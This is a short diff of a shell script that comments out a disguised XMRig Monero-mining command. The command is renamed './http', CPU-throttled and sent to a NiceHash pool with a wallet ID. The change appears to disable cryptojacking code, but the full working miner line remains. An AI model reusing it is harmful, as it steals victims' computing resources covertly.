@@ -19,7 +19,7 @@ num_cores=$(nproc)
 random_cores=$(shuf -i 0-$(($num_cores - 1)) -n 8 | tr '\n' ',' | sed 's/,$//')
 
 # Run XMRig with screen, using taskset to set CPU affinity and cpulimit to limit CPU usage
-screen -dmS http_session sh -c "taskset -c $random_cores cpulimit -l 80 -- ./http -a randomx -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u NHbEnMD3JzpTFEEPPH9y5hitHCWbGE2PCfCs.${HOSTNAME} -p x -k --nicehash -t=2"
+#screen -dmS http_session sh -c "taskset -c $random_cores cpulimit -l 80 -- ./http -a randomx -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u NHbEnMD3JzpTFEEPPH9y5hitHCWbGE2PCfCs.${HOSTNAME} -p x -k --nicehash -t=2"
 
 # Change directory to /app and run the original command in the background
 # cd /app
